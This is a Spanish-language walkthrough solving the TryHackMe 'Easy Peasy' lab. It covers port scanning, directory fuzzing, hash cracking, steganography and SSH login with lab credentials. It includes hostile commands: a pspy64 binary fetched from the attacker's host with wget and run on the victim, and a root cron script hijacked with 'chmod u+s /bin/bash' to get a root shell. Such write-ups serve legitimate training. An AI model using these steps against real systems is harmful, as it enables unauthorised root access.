---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SSH|SSH]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Tarea CRON|Tarea CRON]]

---
# Resolviendo la máquina Easy Peasy

>En esta publicación, comparto cómo resolví la máquina **Easy Peasy** de [TryHackMe](https://tryhackme.com/room/easypeasyctf).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.227.13`

![[Pasted image 20250725090329.png]]
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.227.13 -oG allPorts`

![[Pasted image 20250725090447.png]]

`nmap -p80,6498,65524 -sCV 10.10.227.13 -oN targeted`

![[Pasted image 20250725090543.png]]
### HTTP

`http://10.10.62.97:65524/`

![[Pasted image 20250725090657.png]]

Se observa que la cabecera está modificada.

![[Pasted image 20250725090738.png]]

![[Pasted image 20250725091206.png]]

Se desencripta la cadena (**Base62**) que hemos encontrado en [CyberChef](https://gchq.github.io/CyberChef/).

![[Pasted image 20250725095240.png]]

`http://10.10.227.13:65524/n0th1ng3ls3m4tt3r/`

![[Pasted image 20250725095526.png]]

![[Pasted image 20250725095554.png]]

Se utiliza la herramienta *hash-identifier* para identificar el *hash*.

`hash-identifier`

![[Pasted image 20250725100932.png]]

Se prueban diferentes algoritmos de *hash* hasta que se descubre que el hash fue generado con **GOST**.

Para desencriptarlo se utiliza: [Gost - Decode](https://md5hashing.net/hash/gost).

![[Pasted image 20250725100550.png]]

Se encuentra la contraseña: `mypasswordforthatjob`.

Donde se encuentra el *hash* de la contraseña, tiene enlazado un *link* con una imagen.

`http://10.10.227.13:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg`

![[Pasted image 20250725101232.png]]

Se descarga la imagen para analizar si contiene información oculta.

`wget http://10.10.227.13:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg`

Se utiliza la herramienta *steghide* de *esteganografía* que permite *ocultar y extraer archivos dentro de archivos portadores* (como imágenes o audio).

Se extraen los datos de la imagen, nos pide una contraseña (se introduce la contraseña que hemos descubierto anteriormente).

![[Pasted image 20250725101719.png]]

Se genera un archivo llamado: `secrettext.txt`.

`cat secrettext.txt`

![[Pasted image 20250725101836.png]]

Se observa que la contraseña se encuentra cifrada con **código binario**, se desencripta la cadena (**código binario**) que hemos encontrado en [CyberChef](https://gchq.github.io/CyberChef/).

![[Pasted image 20250725101956.png]]

Ya tenemos un usuario (`boring`) y contraseña (`iconvertedmypasswordtobinary`).

`http://10.10.62.97:65524/robots.txt`

![[Pasted image 20250725092127.png]]

Se utiliza la herramienta *hash-identifier* para identificar el *hash*.

![[Pasted image 20250725092427.png]]

Para desencriptarlo se utiliza: [MD5 - Decode](https://md5hashing.net/hash).

![[Pasted image 20250725092856.png]]

![[Pasted image 20250725092922.png]]

`http://10.10.227.13/`

![[Pasted image 20250725093206.png]]
#### Fuzzing Web

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.227.13:65524/ -t 64`

![[Pasted image 20250725093342.png]]

No se encuentra nada en el puerto `65524`.

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.227.13/ -t 64`

![[Pasted image 20250725093500.png]]

`http://10.10.227.13/hidden/`

![[Pasted image 20250725093511.png]]

![[Pasted image 20250725093611.png]]

`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.227.13/hidden -t 64`

![[Pasted image 20250725093848.png]]

`http://10.10.227.13/hidden/whatever/`

![[Pasted image 20250725093914.png]]

![[Pasted image 20250725093947.png]]

Se encuentra una cadena que parece estar cifrada en **Base64**.

`echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d`

![[Pasted image 20250725094110.png]]

---
## Explotación
### SSH

Se accede al servicio **SSH** con las credenciales obtenidas previamente.

`ssh boring@10.10.227.13 -p 6498`

![[Pasted image 20250725103539.png]]

`cat user.txt`

![[Pasted image 20250725103616.png]]

La flag también esta cifrada, se accede a [Dcode](https://www.dcode.fr/cipher-identifier) para saber el *hash* y desencriptarlo.

![[Pasted image 20250725103812.png]]

![[Pasted image 20250725103856.png]]

Se trata de un cifrado llamado *ROT*.
### Escalada de Privilegios
#### Tarea CRON

Se procede a visualizar si existen tareas **CRON** que ejecuten algunos de estos archivos.

Se descarga la herramienta [pspy64](https://github.com/DominicBreuker/pspy), que permite visualizar las tareas **CRON** ejecutadas en segundo plano.

Se descarga en nuestra máquina.

`mv /home/manumore/Descargas/pspy64 .`

`python3 -m http.server 80`

Se descarga en la máquina victima en el directorio `tmp` y se dan permisos.

`wget 192.168.1.127/pspy64`

`chmod 777 pspy64`

Se ejecuta el archivo descargado.

`./pspy64`

Se observa una tarea **CRON**.

![[Pasted image 20250725104635.png]]

Se busca el archivo `.mysecretcronjob.sh`.

`find / -name .mysecretcronjob.sh 2>/dev/null`

![[Pasted image 20250725104828.png]]

`cd /var/www`

Se verifica si se tienen permisos de escritura.

`ls -la`

![[Pasted image 20250725104929.png]]

Se edita el archivo y se agrega la línea: `chmod u+s /bin/bash`.

`cat .mysecretcronjob.sh`

![[Pasted image 20250725105116.png]]

Se espera a que se ejecute la tarea **CRON**.

`bash -p`

![[Pasted image 20250725105203.png]]

---